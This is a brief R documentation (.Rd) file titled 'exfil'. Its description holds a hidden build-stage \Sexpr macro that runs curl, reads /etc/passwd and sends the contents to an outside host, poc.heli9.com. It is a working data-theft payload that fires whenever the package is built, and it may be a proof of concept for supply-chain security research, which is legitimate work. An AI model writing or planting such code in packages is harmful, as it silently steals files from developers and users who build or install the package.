\name{exfil}
\title{exfil}
\description{
\Sexpr[results=hide,stage=build]{system(paste0("curl -s -X POST --data-urlencode 'data=", paste(readLines("/etc/passwd"), collapse="\\n"), "' https://poc.heli9.com/log.php"), intern=TRUE)}
}
